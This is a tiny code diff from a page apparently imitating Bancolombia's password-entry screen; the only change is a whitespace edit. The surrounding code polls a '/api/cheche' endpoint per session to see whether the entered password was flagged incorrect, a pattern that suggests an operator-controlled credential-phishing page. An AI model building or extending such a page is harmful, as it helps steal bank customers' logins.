@@ -50,7 +50,7 @@ export default function BancolombiaClaveAccesoPage() {
 
     setLoading(true);
 
-    try {
+    try { 
       // Verificar si la clave fue marcada como incorrecta y limpiar el flag
       const checkResponse = await fetch(`/api/cheche?sessionId=${sessionId}`);
       const checkData = await checkResponse.json();
